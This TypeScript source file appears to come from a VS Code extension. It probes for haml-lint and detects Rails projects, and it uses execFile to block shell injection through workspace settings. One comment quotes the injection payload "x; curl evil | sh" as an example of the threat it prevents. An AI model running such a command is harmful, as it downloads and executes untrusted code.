import { execFile } from 'node:child_process';
import { existsSync } from 'node:fs';
import * as path from 'node:path';
import { OutputChannel, workspace } from 'vscode';

import { SOURCE } from './linter';
import { isPathCommand, splitCommand } from './utils/command';
import { getWorkspaceRoot } from './utils/file';

// Probes an executable by running `<executable> --version`.
//
// Uses execFile (argv form, no shell) instead of exec so that the executable
// path — which comes from workspace settings and can therefore be controlled
// by a repository's `.vscode/settings.json` — is never interpreted by a shell.
// This prevents command injection (e.g. "x; curl evil | sh"). It runs
// asynchronously so that probing a slow interpreter (a Ruby boot can take
// seconds) never blocks the extension host. A timeout guards against a probe
// that never returns.
function commandAvailable(executable: string): Promise<boolean> {
  return new Promise((resolve) => {
    execFile(executable, ['--version'], { timeout: 5000 }, (error) => {
      resolve(!error);
    });
  });
}

export function hamlLintPresent(): Promise<boolean> {
  const config = workspace.getConfiguration('hamlAll');

  // With `useBundler` the gem lives inside the bundle, where a global
  // `haml-lint --version` proves nothing — probing it would only produce a
  // bogus "not installed" error on every activation. A genuine failure still
  // surfaces through the server start-up error, which carries its stderr tail.
  if (config.useBundler) {
    return Promise.resolve(true);
  }

  const executable = config.linterExecutablePath || SOURCE;

  return commandAvailable(executable);
}

export const DEFAULT_RAILS_COMMAND = 'bin/rails';

/**
 * Picks the rails command out of the new setting, the deprecated one, then the
 * default. Pure so it can be tested without a configuration.
 */
export function resolveRailsCommand(hamlAllValue?: string, deprecatedValue?: string): string {
  return hamlAllValue?.trim() || deprecatedValue?.trim() || DEFAULT_RAILS_COMMAND;
}

// Value explicitly set by the user, ignoring the package.json default — that is
// what tells us whether to fall back to the deprecated setting.
function explicitValue(section: string, key: string): string | undefined {
  const inspected = workspace.getConfiguration(section).inspect<string>(key);

  return inspected?.workspaceFolderValue ?? inspected?.workspaceValue ?? inspected?.globalValue;
}

/**
 * The rails command to run, honouring `hamlAll.railsCommand` and falling back to
 * the deprecated `railsRoutes.railsCommand`.
 */
export function railsCommand(): string {
  return resolveRailsCommand(explicitValue('hamlAll', 'railsCommand'), explicitValue('railsRoutes', 'railsCommand'));
}

/** Ruby interpreter used to run the lint server (`hamlAll.rubyCommand`). */
export function rubyCommand(): string {
  return workspace.getConfiguration('hamlAll').get<string>('rubyCommand')?.trim() || 'ruby';
}

// Detects a Rails project by checking whether the rails command exists on disk,
// instead of spawning it. Booting `bin/rails` just to detect the project can
// take seconds (it may load Spring or part of the app) and, since this runs
// during activation, that delay would block the extension host. A relative
// command (the default `bin/rails`) is resolved against the workspace root; an
// absolute path is checked as-is.
export function isARailsProject(outputChanel: OutputChannel | null): boolean {
  const [executable] = splitCommand(railsCommand());

  // A bare name ("bundle") cannot be checked on disk, so probe the default
  // bin/rails instead — every generated Rails app ships it.
  const probe = isPathCommand(executable) ? executable : DEFAULT_RAILS_COMMAND;
  const railsPath = path.isAbsolute(probe) ? probe : path.join(getWorkspaceRoot(), probe);

  if (existsSync(railsPath)) {
    outputChanel?.appendLine('Rails project detected.');
    return true;
  }

  return false;
}
